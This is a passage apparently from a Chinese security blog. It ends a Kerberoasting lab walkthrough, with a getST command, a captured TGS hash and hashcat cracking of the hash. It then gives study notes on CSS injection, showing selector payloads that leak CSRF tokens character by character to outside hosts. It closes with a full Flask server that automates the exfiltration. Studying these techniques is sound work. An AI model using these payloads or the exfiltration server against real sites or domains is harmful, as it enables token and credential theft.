class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][<span class="number">16</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Skipping %s/%s due to incompatible e-type %d&#x27;</span> % (</span><br><span class="line">                decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;sname&#x27;</span>][<span class="string">&#x27;name-string&#x27;</span>][<span class="number">0</span>], decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;sname&#x27;</span>][<span class="string">&#x27;name-string&#x27;</span>][<span class="number">1</span>],</span><br><span class="line">                decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.__saveTGS <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># Save the ticket</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;About to save TGS for %s&#x27;</span> % username)</span><br><span class="line">            ccache = CCache()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ccache.fromTGS(tgs, oldSessionKey, sessionKey)</span><br><span class="line">                ccache.saveFile(<span class="string">&#x27;%s.ccache&#x27;</span> % username)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="built_in">str</span>(e))</span><br></pre></td></tr></table></figure>
    </div>
</div>
<p>接下来就可以获取<code>SPN</code>的ST了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 python getST.py xiaorang.lab/zhangjian:i9XDE02pLVf -dc-ip 172.22.9.7 -spn TERMSERV/win2016.xiaorang.lab</span><br></pre></td></tr></table></figure><br>ST<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$krb5tgs$23$*$XIAORANG.LAB$*$0ce89c5a5440709db8cd0da786ab1ed5$c4b6d477aac038b4958157e55377f91b03788e4173db8c5df6cb3d95a8e2f9d78bd486af0df68960aec23e52ec2a4c9ca7707318d08d9a3c995ab0c70042f2b4c7c7ea9fc269bb31a76597692ca7f2774283d90c3f19f280236fa6c12ec7d52da1c6f24fb7f2a508ba8bb3fcafb4a669bc6856e567ec6d96d82c42600d07aa5fd68a0b298a3964525bdb77d1227df64a9a92a1aeeafacbf5238c92a156450dd934ed5e7bd6b9b8a965e6d522b6c7501ae49d95818aad9304aeb54e75824f02ef3a8855212ecffd272507308ab996b14dd648c7828962995b249c44a74ddacde8ada0f58c7f84d09b2914f48464aa8f02ea129737c3ebe277e39743184c6715967a64feec56aa174d065151fbd36b3d655d7fb7dae66830efa59798023522e6d40d2e17c5d3465609af7df0a61ea66961256455a51405c6162efdab3c29148ff3bdff77923dafec9647b6bb992ba3bd981a0bf60b2f1629cce9bf9f4e2a3dbd62ff21c10a0f5eba667fc8649c2d1eab273c023209e7273bd7eeef39ffd32889ff2467b866e6b454e7bb2b750065ed6b3ddb75a3a0cf6234ed26eab8ed9bd00e685a40036725cfd6416e1c607c91981e19bb71f27d78365756c0e2d0da57166799058b22a7d507b2413191be7a36a887464d6849a18555a9d0b087dd334d9c05687e3d7519110463f4c9d916627f35aa20059dd57b9d35024aa3d716fc20a7c1b4b9d8756c4a9a6aafd81b07033347c718fc23a51b6919c5dded962e0e7e426fd06c15b61feacb3aa9a8d040b74b38e2f333cf3522509e18dd77cd2e3a743084e0dff25ca1d3547cf91575aedd74541bdaa1a96399983b39b12221f157c3ccdfec099b1ba638fbde2a563683d11fe7d5844b13e6d800f0fdcc59056c747b691c5083469f576bac3f4960c176b3e84a74905ef7cb73942e8514cbb00dd2ee74935917c1fe3ff289936eba9aeb1233069f138e623f8593ec37a145148e5320f3ecc0ca06a7107f93d8d7d2f6ed29f03e3a1f547dc7637b40c424e5357f95ddf19d24dcb67ce9a8c166b3c5b28ed9d4da1cae1762c4dda158a8ef06cd4153d9f0eb6fbe695d105bce8e0270e3a24b01156a87e729b5c87fec57f08f91428d3652e5227903665d41fffec8a41b5ddd4426fb3324066af683a86c1bca6e1cc82b04d3a3508bb31e9f5545f63775ed1271c03b498dcad91acc21625bf1b047f7cb9989b8cca254219d85d804ccb51814c538762f5474d44411d9c411b1f99682c0892c6f95e149c6c1fb186486e1e1400b0d888c1b94b3d659ec30e45af95dee0d7e3835b457c8d0a9f7d81c1b9bdc636673972f56118706e56f44238fad032c9e4c2ff906a3483c1437e449f82da86bb88a82be824501940284c59b3e62bcfc5a94faece71397c906b680f122c3c3755811371bf183f018aa927834662bc6d977424a781074ec440ee46cf7df449eeb215bfbf3037d7f208527a7d929c828f4752d01decf011d0a0aa9746a1b5a64694d04</span><br></pre></td></tr></table></figure></p>
<h2 id="hashcat-爆破"><a href="#hashcat-爆破" class="headerlink" title="hashcat 爆破"></a>hashcat 爆破</h2><p>记得用rockyou爆破<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 13100 hash.txt pass.txt</span><br></pre></td></tr></table></figure><br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/4.png" alt><br>可以看到密码是@Passw0rd@</p>
<p>接下来爆破另一个，命令与上面相同，把hash替换一下就行<br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/5.png" alt></p>
<p>可以看到密码也是一样的</p>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>最后diff一下两个hash，会发现是完全一样的，那么就应该不管是通过请求<code>SPN</code>还是<code>user</code>，都可以获取到相同的hash，所以我应该都是获取到<code>chenchen</code>的这个域用户的hash<br>那么平时说的获取服务的TGS，其实也就是在获取绑定该服务的域用户的hash</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a href="https://y4er.com/posts/kerberos-kerberoasting-spn/">https://y4er.com/posts/kerberos-kerberoasting-spn/</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全10-CSS injection（笔记）</title>
    <url>/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没想到N1CTF出了css注入的题，第一眼就觉得是css注入，可惜那时候没学到这块，而且当时还在省赛（虽然应该也做不出来）</p>
<ul>
<li><a href="https://aszx87410.github.io/beyond-xss/ch3/css-injection/">https://aszx87410.github.io/beyond-xss/ch3/css-injection/</a><span id="more"></span>
</li>
</ul>
<h1 id="CSS注入简介"><a href="#CSS注入简介" class="headerlink" title="CSS注入简介"></a>CSS注入简介</h1><p>CSS可以通过判断属性中是否存在某个值，然后向外请求图片，这样就可以偷取存在于页面中的东西了，但是像 <code>document.cookie</code> 应该还是没办法的</p>
<h1 id="利用CSS偷取信息"><a href="#利用CSS偷取信息" class="headerlink" title="利用CSS偷取信息"></a>利用CSS偷取信息</h1><p>CSS有两个特性，当把两个特性结合在一起的时候就可以进行攻击了</p>
<ol>
<li>属性选择器</li>
</ol>
<ul>
<li><code>input[value^=a]</code> 可以选择到开头是a的</li>
<li><code>input[value$=a]</code> 选择结尾是a的</li>
<li><code>input[value*=a]</code> 选择含有a的</li>
</ul>
<ol>
<li>发送请求<br>在上面的判断成功后，可以向外发送请求，否则就收不到请求，很经典的类似于bool注入的攻击手法了<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;secret&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=a</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;secret&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;b&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=b</span>)</span><br><span class="line">&#125;</span><br><span class="line">//....</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里的input就是input标签，如果想选取例如 <code>&lt;a&gt;</code> 就可以</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[name=<span class="string">&quot;secret&quot;</span>]</span><span class="selector-attr">[href^=<span class="string">&quot;a&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://101.43.112.74:9001/?q=a</span>)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">a</span> name=&quot;secret&quot; href=&quot;abc&quot;&gt;<span class="selector-tag">a</span>&lt;/<span class="selector-tag">a</span>&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<h2 id="hidden属性如何偷取"><a href="#hidden属性如何偷取" class="headerlink" title="hidden属性如何偷取"></a>hidden属性如何偷取</h2><p>现在页面有如下的代码，应该如何取盗取他的token<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/action&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果直接构造前面的那个payload是没有效果的<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://example.com?q=a</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>因为他是hidden属性，并不会显示到页面上，css就不会去加载他<br>这时候可以去选取他的下一个属性<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> + <span class="selector-tag">input</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://example.com?q=a</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>因为他的下一个属性是存在于页面中的，这时候就能去加载，但是如果这个hidden在最后，比如<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/action&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><br>上面的方法就没法用了</p>
<blockquote>
<p>在form外面的是没法加载的，比如你的css是<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> + <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://101.43.112.74:9001</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>你的代码是<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/action&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样是不会有发出请求的</p>
</blockquote>
<p><code>:has</code> 现在有这么一个选择器<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">form</span><span class="selector-pseudo">:has</span>(<span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span>)&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://example.com?q=a</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>有这个选择器几乎就可以随便选了，但是目前firefox还不支持这个选择器。</p>
<h2 id="偷meta"><a href="#偷meta" class="headerlink" title="偷meta"></a>偷meta</h2><p>一般是通过js获取token，然后去提交<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">content</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span> <span class="comment">&lt;!-- 这是CSRF令牌 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF Token Example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;submit-button&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;submit-button&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 从&lt;meta&gt;标签中获取CSRF令牌</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> csrfToken = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meta[name=&quot;csrf-token&quot;]&#x27;</span>).<span class="title function_">getAttribute</span>(<span class="string">&#x27;content&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 创建一个HTTP请求</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 配置请求</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/process&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 设置请求头，包括CSRF令牌</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;X-CSRF-Token&quot;</span>, csrfToken);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 定义请求完成时的回调函数</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;请求成功！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;请求失败！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 发送请求</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">send</span>(<span class="string">&quot;data=example_data&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>当然，同样可以通过has过滤器去攻击<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span><span class="selector-pseudo">:has</span>(meta<span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[content^=<span class="string">&quot;a&quot;</span>]</span>) &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://exp/</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但是meta可以被设置为可见的，与hidden的input不同，不过head也是不可见的，要把head一起设置为可见的（就算不把meta写到head中，浏览器也会自己把他调到head中）<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">head,meta &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">meta<span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[content^=<span class="string">&quot;a&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://exp/</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>图片不会显示出来，是因为content只是一个属性，并不是HTML的text，但是meta是可见的，只不过他的高度为0<br><img src="/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">meta<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="built_in">attr</span>(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是可以利用上面的代码去显示图片</p>
<h2 id="一次性偷取所有字符"><a href="#一次性偷取所有字符" class="headerlink" title="一次性偷取所有字符"></a>一次性偷取所有字符</h2><p>前面讲解的方法都只能偷取一次，但是css有一个特性<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@import</span> url(<span class="attribute">https</span>://myserver.com/start?len=<span class="number">8</span>)</span><br></pre></td></tr></table></figure><br>可以通过上面的代码引入css，那么用下面的代码就可以一次一次去请求value<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;<span class="keyword">@import</span> url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">1</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">2</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">3</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">4</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">5</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">6</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">7</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">8</span>)&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里我设计了一个服务端的脚步用于一次性的css注入</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        点击显/隐内容
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template,request,make_response</span><br><span class="line"><span class="keyword">import</span> string,time</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/payload&quot;</span>,methods = [<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload</span>():</span><br><span class="line">    length = <span class="built_in">int</span>(request.args.get(<span class="string">&quot;len&quot;</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;prefix&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            prefix = f.read()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;suffix&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            suffix = f.read()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(prefix) &lt; length-<span class="number">1</span> <span class="keyword">or</span> <span class="built_in">len</span>(suffix) &lt; length-<span class="number">1</span>:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    prefixs = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">        prefixs.append(csspayload(<span class="string">&quot;^&quot;</span>,<span class="string">&quot;prefix&quot;</span>,prefix+x))</span><br><span class="line">    </span><br><span class="line">    suffixs = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">        suffixs.append(csspayload(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;suffix&quot;</span>,x+suffix))</span><br><span class="line"></span><br><span class="line">    prefixs = <span class="string">&#x27;\n&#x27;</span>.join(prefixs)</span><br><span class="line">    suffixs = <span class="string">&#x27;\n&#x27;</span>.join(suffixs)</span><br><span class="line"></span><br><span class="line">    rsp = make_response(prefixs + <span class="string">&#x27;\n&#x27;</span> + suffixs)</span><br><span class="line">    rsp.headers[<span class="string">&#x27;Content-Type&#x27;</span>]= <span class="string">&quot;text/css&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csspayload</span>(<span class="params">symbol,fix,payload</span>):</span><br><span class="line">    <span class="keyword">if</span> fix == <span class="string">&#x27;prefix&#x27;</span>:</span><br><span class="line">        origin = \</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;input[name=&quot;csrf-token&quot;][value&#123;symbol&#125;=&quot;&#123;payload&#125;&quot;] + input &#123;&#123;background: url(http://192.168.3.189:5002/&#123;fix&#125;?q=&#123;payload&#125;)&#125;&#125;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(symbol=symbol,fix=fix,payload=payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        origin = \</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;input[name=&quot;csrf-token&quot;][value&#123;symbol&#125;=&quot;&#123;payload&#125;&quot;] + input &#123;&#123;border-image: url(http://192.168.3.189:5002/&#123;fix&#125;?q=&#123;payload&#125;)&#125;&#125;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(symbol=symbol,fix=fix,payload=payload)</span><br><span class="line">    <span class="keyword">return</span> origin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/prefix&quot;</span>,methods = [<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prefix</span>():</span><br><span class="line">    q = request.args.get(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;prefix&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(q)</span><br><span class="line"></span><br><span class="line">    rsp = make_response(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    rsp.headers[<span class="string">&#x27;Content-Type&#x27;</span>]= <span class="string">&quot;image/jpeg&quot;</span></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/suffix&quot;</span>,methods = [<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">suffix</span>():</span><br><span class="line">    q = request.args.get(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;suffix&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(q)</span><br><span class="line">    rsp = make_response(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    rsp.headers[<span class="string">&#x27;Content-Type&#x27;</span>]= <span class="string">&quot;image/jpeg&quot;</span></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="string">&#x27;5002&#x27;</span>)</span><br></pre></td></tr></table></figure>
    </div>
</div>
<p>想加快效率，可以通过prefix和suffix的结合来实现两个字符的提取，但是suffix的时候要把 <code>background</code> 改为<code>border-image</code> ，不然的话内容会被覆盖掉，就不会发出请求了</p>
<blockquote>
<p>记录一下踩过的坑</p>
<ol>
<li>返回的content-type必须设置为text/css</li>
<li>import url最好和background url不一样（没仔细看文章）</li>
<li>要用border-image，border-background用不了</li>
<li>从后读取字符的时候，要x+suffix，而不是suffix+x</li>
</ol>
</blockquote>
